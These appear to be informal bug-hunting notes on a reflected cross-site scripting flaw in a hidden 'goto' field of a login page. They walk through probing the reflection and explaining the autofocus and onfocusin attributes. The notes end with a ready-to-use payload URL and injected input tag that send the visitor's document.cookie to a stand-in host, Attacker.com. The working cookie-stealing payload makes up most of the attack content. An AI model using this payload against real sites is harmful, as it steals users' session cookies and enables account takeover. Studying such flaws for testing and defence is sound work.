			GET /login.php?goto=holy
				\_reflected-value on source code
					\_<input name="goto" value="holy" type="hidden">


			GET /login.php?goto=holy<"'>
				\_reflected-value on source code
					\_<input name="goto" value="holy<"'>  --> input tag is closed
						" type="hidden">


			My thought we can also do like this:
			------------------------------------
			holy<"'>  -> holy"<' > (i dont know it can't be)


			autofocus meanings:
			-------------------
			The autofocus attribute is a boolean attribute.
			When present, it specifies that the element should automatically get focus when the page loads.


			onfocusin:
			----------
			Execute a JavaScript when an input field is about to get focus.


			Payload:
			-------
			https://firstbloodhackers.com/login.php?goto=xyz%22%20autofocus%20onfocusin=%22window.location.href=`http://Attacker.com/?${document.cookie}`%22%3E


			Ultimate Payload:
			-----------------
			XSS payload are awesome.

			when the value is reflected in source-code and using "autofocus" the input field automatically get in focus 
			and "onfocusin" listening for any upcoming focus then he execute the JavaScript and BOOM.  


			<input name="goto" value="xyz" autofocus onfocusin="window.location.href=`http://Attacker.com/?${document.cookie}`">
